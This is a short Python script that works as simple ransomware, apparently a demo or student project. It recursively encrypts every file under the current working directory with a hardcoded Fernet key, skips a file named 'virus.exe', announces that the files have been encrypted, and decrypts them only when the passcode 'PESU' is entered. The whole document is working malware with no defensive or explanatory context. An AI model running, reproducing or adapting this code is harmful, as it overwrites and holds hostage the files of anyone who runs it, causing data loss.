import os
from cryptography.fernet import Fernet

key = b'qBtCdcrf8-X5DJWZ6vovT9Kvmo5EcjJhUydywRu-0vI='
f= Fernet(key)

cwd = os.getcwd()


def encryption(path):
    global f
    files = os.listdir(path)
    if 'virus.exe' in files:
        files.remove('virus.exe')

    for i in files:
        file = path+'/'+i
        if os.path.isfile(file):
            with open(file,'rb') as f1:
                data = f1.read()

            enc_data = f.encrypt(data)

            with open(file,'wb') as f2:
                f2.write(enc_data)
        else:
            encryption(path+'/'+i)

def decryption(path):
    global f
    files = os.listdir(path)
    if 'virus.exe' in files:
        files.remove('virus.exe')

    for i in files:
        file = path+'/'+i
        if os.path.isfile(file):
            with open(file,'rb') as f1:
                data = f1.read()

            dec_data = f.decrypt(data)

            with open(file,'wb') as f2:
                f2.write(dec_data)
        else:
            decryption(path+'/'+i)

encryption(cwd)

print("Your files have been encrypted....")
code = "PESU"
fenc = True
while fenc:
    if input("Enter the passcode to Decrypt the files: ") == code:
        decryption(cwd)
        fenc = not(bool(int(input("Are your Files decrypted. Y-1/N-0:"))))
    else:
        print("Wrong Passcode...")